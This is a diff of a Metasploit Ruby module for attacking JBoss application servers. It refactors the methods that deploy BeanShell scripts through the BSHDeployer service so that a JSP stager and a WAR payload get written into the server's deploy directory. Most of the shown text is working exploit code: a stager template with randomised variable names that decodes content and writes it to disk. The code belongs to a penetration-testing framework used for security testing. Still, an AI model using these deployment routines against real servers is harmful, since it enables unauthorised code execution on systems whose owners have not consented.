@@ -1,6 +1,14 @@
 # -*- coding: binary -*-
 module Msf::HTTP::JBoss::BSH
 
+  def initialize(info = {})
+    super
+    register_options(
+      [
+        Msf::OptString.new('PACKAGE',   [ false,  'The package containing the BSHDeployer service', 'auto' ])
+      ], self.class)
+  end
+  
   def deploy_bsh(bsh_script)
     if datastore['PACKAGE'] == 'auto'
       packages = %w{ deployer scripts }
@@ -13,39 +21,34 @@ module Msf::HTTP::JBoss::BSH
       print_status("Attempting to use '#{p}' as package")
       res = invoke_bshscript(bsh_script, p)
       if !res
-        fail_with(Failure::Unknown, "Unable to deploy WAR [No Response]")
+        print_warning("Unable to deploy WAR [No Response]")
       end
 
-    if (res.code < 200 || res.code >= 300)
-      case res.code
-        when 401
-          print_warning("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
-          fail_with(Failure::NoAccess, "Authentication requested: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
+      if (res.code < 200 || res.code >= 300)
+        case res.code
+          when 401
+            print_warning("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
         end
 
         print_error("Unable to deploy BSH script [#{res.code} #{res.message}]")
-        fail_with(Failure::Unknown, "Invalid reply: #{res.code} #{res.message}")
       else
         success = true
         @pkg = p
         break
       end
     end
-
-    if not success
-      fail_with(Failure::Unknown, "Failed to deploy the WAR payload")
-    end
+    return success
   end
 
-  def deploy_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)
-	# The following jsp script will write the exploded WAR file to the deploy/
-	# directory. This is used to bypass the size limit for GET/HEAD requests
-	# Dynamic variables, only used if we need a stager
-	decoded_var = Rex::Text.rand_text_alpha(8+rand(8))
-	file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
-	jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
-	fos_var = Rex::Text.rand_text_alpha(8+rand(8))
-	stager_jsp = <<-EOT
+  def gen_stager_bsh(app_base, stager_base, stager_jsp_name, content_var)
+    # The following jsp script will write the exploded WAR file to the deploy/
+    # directory. This is used to bypass the size limit for GET/HEAD requests
+    # Dynamic variables, only used if we need a stager
+    decoded_var = Rex::Text.rand_text_alpha(8+rand(8))
+    file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
+    jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
+    fos_var = Rex::Text.rand_text_alpha(8+rand(8))
+    stager_jsp = <<-EOT
 <%@page import="java.io.*,
     java.util.*,
     sun.misc.BASE64Decoder"
@@ -94,10 +97,10 @@ FileOutputStream #{fstream_var} = new FileOutputStream(#{jsp_file_var});
 #{fstream_var}.close();
 EOT
     print_status("Creating exploded WAR in deploy/#{stager_base}.war/ dir via BSHDeployer")
-    deploy_bsh(stager_bsh_script)
+    return stager_bsh_script 
   end
 
-  def deploy_payload_bsh(encoded_payload, app_base)
+  def gen_payload_bsh(encoded_payload, app_base)
 
     # The following Beanshell script will write the exploded WAR file to the deploy/
     # directory
@@ -117,8 +120,7 @@ fstream.close();
 EOT
 
     print_status("Creating exploded WAR in deploy/#{app_base}.war/ dir via BSHDeployer")
-    deploy_bsh(payload_bsh_script)
-
+    return payload_bsh_script  
   end
 
   # Invokes +bsh_script+ on the JBoss AS via BSHDeployer
